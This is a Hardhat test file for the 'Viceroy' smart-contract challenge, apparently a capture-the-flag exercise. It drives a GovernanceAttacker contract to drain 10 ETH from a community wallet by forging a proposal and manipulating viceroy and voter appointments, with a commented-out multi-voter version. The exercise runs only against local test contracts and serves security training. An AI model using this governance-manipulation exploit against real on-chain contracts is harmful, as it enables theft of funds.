const { expect, use } = require("chai")
const { ethers } = require("hardhat")
const { BigNumber } = ethers
const helpers = require("@nomicfoundation/hardhat-network-helpers")

use(require("chai-as-promised"))

describe("Viceroy", async function () {
  let attackerWallet, attacker, oligarch, governance, communityWallet

  before(async function () {
    ;[_, attackerWallet,plusAddress,plusAddress1,plusAddress2,plusAddress3,plusAddress4,plusAddress5,
      plusAddress6,plusAddress7,plusAddress8,plusAddress9,plusAddress10
    ] = await ethers.getSigners()

    // Name your contract GovernanceAttacker. It will be minted the NFT it needs.
    const AttackerFactory = await ethers.getContractFactory(
      "GovernanceAttacker",
    )
    attacker = await AttackerFactory.connect(attackerWallet).deploy()
    await attacker.deployed()

    const OligarchFactory = await ethers.getContractFactory("OligarchyNFT")
    oligarch = await OligarchFactory.deploy(attacker.address)
    await oligarch.deployed()

    const GovernanceFactory = await ethers.getContractFactory("Governance")
    governance = await GovernanceFactory.deploy(oligarch.address, {
      value: BigNumber.from("10000000000000000000"),
    })
    await governance.deployed()

    const walletAddress = await governance.communityWallet()
    communityWallet = await ethers.getContractAt(
      "CommunityWallet",
      walletAddress,
    )
    expect(await ethers.provider.getBalance(walletAddress)).equals(
      BigNumber.from("10000000000000000000"),
    )
  })

  // prettier-ignore;
  it("conduct your attack here", async function () {

    // //////////////////////////////////  create one Proposal   // //////////////////////////////////
    let ABI = [
      "function exec(address, bytes calldata data, uint256 value)"
    ];
    
    let iface = new ethers.utils.Interface(ABI);

    let proposal =  iface.encodeFunctionData("exec", [attackerWallet.address,"0x", BigNumber.from("10000000000000000000")]);
    
    // //////////////////////////////////  create one Proposal   // //////////////////////////////////

    // solution 1
    await attacker.connect(attackerWallet).attack(governance.address,proposal); // let attackerWallet create Viceroy and voter


    // solution 2, this should need more real EOA address
    // // viceroy: attackerWallet, vote:plusAddress
    // await attacker.connect(attackerWallet).attack(governance.address);


    // // //////////////////////////////////  create one Proposal   // //////////////////////////////////
    // let ABI = [
    //   "function exec(address, bytes calldata data, uint256 value)"
    // ];
    
    // let iface = new ethers.utils.Interface(ABI);

    // let proposal =  iface.encodeFunctionData("exec", [attackerWallet.address,"0x", BigNumber.from("10000000000000000000")]);
    
    // console.log("abiEncodeData:",proposal);

    // // console.log(proposal); 
    // await governance.connect(attackerWallet).createProposal(attackerWallet.address,proposal); // vercial execute
      
    // const  proposalId =  ethers.BigNumber.from(ethers.utils.keccak256(proposal));
    // console.log(proposalId);  
    // // //////////////////////////////////  create one Proposal   // //////////////////////////////////

    
    // // one voter one vote
    // await governance.connect(attackerWallet).approveVoter(plusAddress.address);
    // await governance.connect(plusAddress).voteOnProposal(proposalId,true,attackerWallet.address);

    // await governance.connect(attackerWallet).approveVoter(plusAddress1.address);
    // await governance.connect(plusAddress1).voteOnProposal(proposalId,true,attackerWallet.address);


    // await governance.connect(attackerWallet).approveVoter(plusAddress2.address);
    // await governance.connect(plusAddress2).voteOnProposal(proposalId,true,attackerWallet.address);

    // await governance.connect(attackerWallet).approveVoter(plusAddress3.address);
    // await governance.connect(plusAddress3).voteOnProposal(proposalId,true,attackerWallet.address);

    // await governance.connect(attackerWallet).approveVoter(plusAddress4.address);
    // await governance.connect(plusAddress4).voteOnProposal(proposalId,true,attackerWallet.address);


    // // delete Viceroy and reset Viceroy
    // await attacker.attack2(attackerWallet.address,1); // deposeViceroy(address viceroy, uint256 id) 
    // await attacker.connect(attackerWallet).attack(governance.address);

    // await governance.connect(attackerWallet).approveVoter(plusAddress5.address);
    // await governance.connect(plusAddress5).voteOnProposal(proposalId,true,attackerWallet.address);

    // await governance.connect(attackerWallet).approveVoter(plusAddress6.address);
    // await governance.connect(plusAddress6).voteOnProposal(proposalId,true,attackerWallet.address);


    // await governance.connect(attackerWallet).approveVoter(plusAddress7.address);
    // await governance.connect(plusAddress7).voteOnProposal(proposalId,true,attackerWallet.address);

    // await governance.connect(attackerWallet).approveVoter(plusAddress8.address);
    // await governance.connect(plusAddress8).voteOnProposal(proposalId,true,attackerWallet.address);

    // await governance.connect(attackerWallet).approveVoter(plusAddress9.address);
    // await governance.connect(plusAddress9).voteOnProposal(proposalId,true,attackerWallet.address);


    // await governance.executeProposal(proposalId);


  });

  after(async function () {
    const walletBalance = await ethers.provider.getBalance(
      communityWallet.address,
    )
    expect(walletBalance).to.equal(0)

    const attackerBalance = await ethers.provider.getBalance(
      attackerWallet.address,
    )
    expect(attackerBalance).to.be.greaterThanOrEqual(
      BigNumber.from("10000000000000000000"),
    )

    expect(
      await ethers.provider.getTransactionCount(attackerWallet.address),
    ).to.equal(2, "must exploit in one transaction")
  })
})
